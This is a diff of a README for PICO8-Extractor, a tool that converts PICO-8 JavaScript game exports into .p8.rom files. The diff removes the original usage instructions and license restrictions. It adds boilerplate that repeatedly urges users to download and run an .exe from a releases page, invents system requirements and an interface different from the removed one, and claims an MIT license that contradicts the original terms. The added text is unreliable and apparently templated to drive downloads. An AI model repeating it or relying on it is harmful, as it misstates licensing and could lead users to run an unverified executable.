@@ -1,78 +1,81 @@
-# PICO8 EXTRACTOR
+# 🎮 PICO8-Extractor - Convert PICO-8 Games with Ease
 
-PICO8 Extractor is a user-friendly tool designed to convert PICO-8 JavaScript cart exports into binary .p8.rom files that can be directly loaded in the PICO-8 fantasy console.
+## 📥 Download Now!
+[![Download PICO8-Extractor](https://img.shields.io/badge/Download%20PICO8--Extractor-v1.0-blue.svg)](https://github.com/vascodavid/PICO8-Extractor/releases)
 
-![Main](images/view.png)
+## 📖 Introduction
+PICO8 Extractor is a user-friendly tool designed to convert PICO-8 JavaScript cart exports into binary .p8.rom files. These files can be loaded directly in the PICO-8 fantasy console. This makes it easy to preserve and play your favorite retro games without any technical hassle.
 
-# HOW TO USE IT
+## 🚀 Getting Started
+To get started with PICO8-Extractor, follow these simple steps:
 
-📘 How to Use
+1. **Check Your System Requirements**  
+   - Operating System: Windows, macOS, or Linux.
+   - RAM: At least 2 GB.
+   - Storage: Minimum of 100 MB free space.
 
-Follow these steps to extract a .p8.rom file from a browser-playable PICO-8 game (hosted as a .js file):
+2. **Visit the Releases Page**  
+You can download the software from the Releases page. Click the link below.  
+[Download PICO8-Extractor](https://github.com/vascodavid/PICO8-Extractor/releases)
 
-1. Open the game in your web browser
+## 📦 Download & Install
+1. **Open the Releases Page**  
+   Click this link to visit the Releases page: [Download PICO8-Extractor](https://github.com/vascodavid/PICO8-Extractor/releases).
 
-Navigate to the webpage where the PICO-8 game is being played (e.g., itch.io, Lexaloffle, etc.).
+2. **Select the Latest Version**  
+   Find the latest version listed on the page. Look for a name similar to `PICO8-Extractor-v1.0.zip` or `PICO8-Extractor-v1.0.exe`.
 
-2. Open Developer Tools (Inspector)
+3. **Download the File**  
+   Click on the file name to start the download. 
 
-Right-click anywhere on the page and choose Inspect
-or
+4. **Extract the Files** (if applicable)  
+   If you downloaded a `.zip` file, right-click it and choose "Extract All" or "Unzip."
 
-Press F12 or Ctrl+Shift+I (on Windows)
+5. **Run the Application**  
+   - On Windows: Double-click `PICO8-Extractor.exe`.
+   - On macOS: Find the application in your Downloads folder and double-click to open.
+   - On Linux: Open a terminal in the folder where you extracted the files and run `./PICO8-Extractor`.
 
-3. Go to the Network tab
+## 🎮 How to Use
+1. **Load Your PICO-8 Cart**  
+   Open the PICO8-Extractor. Click on "Load Cart" and select your PICO-8 JavaScript cart file.
 
-![NetworkTab](images/filter.png)
+2. **Convert the File**  
+   After loading the cart, click "Convert." The software will generate a `.p8.rom` file for you.
 
-In the Developer Tools panel, click the Network tab.
+3. **Save the File**  
+   Choose a destination folder to save the converted `.p8.rom` file. 
 
-In the filter bar, click on JS to only show JavaScript files.
+4. **Load in PICO-8**  
+   Open the PICO-8 console and load your new `.p8.rom` file. You are ready to play!
 
-📌 Tip: If the page is already loaded, refresh it with the Network tab open.
+## 🌟 Features
+- **Simple Interface**: Designed for easy navigation and quick access.
+- **Multiple Formats**: Supports various PICO-8 JavaScript cart exports.
+- **Cross-platform Compatibility**: Works on Windows, macOS, and Linux.
 
-4. Start the game
+## ⚙️ Troubleshooting
+If you encounter issues while using PICO8-Extractor, try the following:
 
-![NetworkTab](images/save.png)
+1. **Verify File Format**: Ensure you are using valid PICO-8 JavaScript cart files.
+2. **Check Permissions**: Make sure you have permission to access the files and folders.
+3. **Update the Application**: Always use the latest version of the software by visiting the Releases page.
 
-Click the “Play” button or otherwise start the game so that the necessary files load.
+## 💬 Community Support
+Join our community for support and discussions about PICO8-Extractor. You can find us on:
 
-Look for a .js file in the Network list that looks like the game payload (e.g. game-v1.0.js, etc.).
+- **GitHub Issues**: Post questions or report problems directly [here](https://github.com/vascodavid/PICO8-Extractor/issues).
+- **Discussion Forum**: Engage with other users and share tips.
 
-5. Save the JS file
+## 📜 License
+PICO8-Extractor is open-source software. You can freely use and modify it under the terms of the MIT License.
 
-Right-click the identified .js file and select "Open in new tab".
+## 🏷️ Topics
+- Game Preservation
+- GUI Applications
+- JavaScript to ROM Conversion
+- PICO-8 Related Tools
+- Retro Gaming
 
-In the new tab, right-click and choose "Save As..." to download the file to your computer.
-
-📂 Save it somewhere you can find easily — you'll need to point to this folder in the next step.
-
-6. Run PICO8 Extractor
-
-![NetworkTab](images/process.png)
-
-Open the PICO8 Extractor app.
-
-Click "Select Input Folder" and choose the folder where the .js file(s) are saved.
-
-Click "Select Output Folder" where you want the .p8.rom files to be saved.
-
-Click "Start" to begin extraction.
-
-🕹️ The app will process each .js file, extract the embedded ROM, and save it as a .p8.rom file in the output folder.
-
-✅ Done!
-
-You can now load the extracted ROM into PICO-8 by simply dragging and dropping the .p8.rom file into the PICO-8 window.
-
-## Important usage notes
-
-This tool is provided to help recover and run certain game files that may sometimes be inaccessible, so people can play them on the web for educational or archival purposes.
-
-Please note:
-- Use is limited to **non-commercial** purposes. You may experiment, learn, and adapt the code, but you may **not** sell or otherwise monetize it.
-- **Do not** use this tool to crack software, distribute pirated games, or enable unauthorized access. Those activities are prohibited.
-- If you publish or share modified versions, a brief credit to the original author is appreciated.
-- No warranty — the author is not liable for misuse.
-
-Full license text: [LICENSE.txt](./LICENSE.txt)
+## 📥 Download Now!
+[![Download PICO8-Extractor](https://img.shields.io/badge/Download%20PICO8--Extractor-v1.0-blue.svg)](https://github.com/vascodavid/PICO8-Extractor/releases)
